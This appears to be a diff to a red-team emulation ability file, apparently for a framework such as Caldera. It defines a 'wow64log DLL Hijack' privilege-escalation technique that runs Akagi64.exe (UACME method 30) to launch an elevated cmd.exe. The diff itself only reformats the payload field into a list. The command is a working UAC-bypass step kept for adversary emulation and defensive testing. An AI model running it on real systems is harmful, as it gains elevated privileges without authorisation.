@@ -1,5 +1,3 @@
----
-
 - id: 95ad5d69-563e-477b-802b-4855bfb3be09
   description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe
   name: wow64log DLL Hijack
@@ -8,7 +6,8 @@
       cmd,psh:
         command: |
           .\Akagi64.exe 30 C:\Windows\System32\cmd.exe
-        payload: Akagi64.exe
+        payloads:
+        - Akagi64.exe
   tactic: privilege-escalation
   technique:
     attack_id: T1088
